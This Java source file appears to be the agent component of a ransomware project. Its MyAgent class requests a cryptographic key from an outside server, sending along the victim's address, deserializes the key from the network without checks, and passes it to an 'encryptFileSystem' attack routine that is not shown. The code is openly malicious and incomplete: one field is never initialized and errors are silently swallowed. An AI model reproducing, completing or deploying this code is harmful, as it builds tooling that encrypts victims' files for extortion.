package Agent.networking;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import javax.servlet.http.HttpServletRequest;

import Agent.Attack.AttackVector;
import Agent.entites.CryptoKey;

public class MyAgent {

	HttpServletRequest request;

	public void start() throws IOException {

		URL urlForGetRequest = new URL("http://www.myserver.com/requestKey");
		HttpURLConnection con = (HttpURLConnection) urlForGetRequest.openConnection();
		con.setRequestMethod("GET");
		con.setRequestProperty("requestKey", request.getRemoteAddr());
		int responseCode = con.getResponseCode();
		if (responseCode == HttpURLConnection.HTTP_OK) {
			ObjectInputStream is = new ObjectInputStream(con.getInputStream());
			CryptoKey key;
			try {
				key = (CryptoKey) is.readObject();
				AttackVector attack = new AttackVector();
				attack.encryptFileSystem(key);
			} catch (ClassNotFoundException | IOException e) {
			
			}

		}

	}
}
